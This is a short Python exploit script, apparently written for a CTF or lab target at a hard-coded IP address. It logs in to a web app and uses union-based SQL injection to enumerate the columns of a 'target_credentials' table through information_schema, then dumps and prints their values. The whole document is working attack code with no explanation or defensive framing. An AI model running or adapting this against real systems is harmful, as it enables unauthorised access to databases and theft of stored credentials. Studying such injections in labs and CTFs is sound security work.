import requests
import re

url = 'http://47.242.21.212:8081'

s = requests.Session()
data = {'username': '', 'password': 'admin'}
r = s.post(url + '/login', data=data)
for i in range(0, 25):
    a = list()
    data2 = {
        'name': """' union select '1', (SELECT column_name from information_schema.columns where table_name='target_credentials' offset {} limit 1) offset 0 limit 1 -- -""".format(i)}

    r = s.post(url, data=data2)
    filter = re.findall(r'<h1>1:(.*?)</h1>', r.text)
    if ' None' not in filter:
        a.append(filter[0].strip())
        for j in a:
            for i in range(0, 25):
                data2.update({'name': """' union select '1', (SELECT {} from target_credentials offset {} limit 1) offset 0 limit 1 -- -""".format(j, i)})
                r2 = s.post(url, data=data2)
                filter2 = re.findall(r'<h1>1:(.*?)</h1>', r2.text)
                if ' None' not in filter2:
                    print(f'column -> {j}, value -> {filter2}')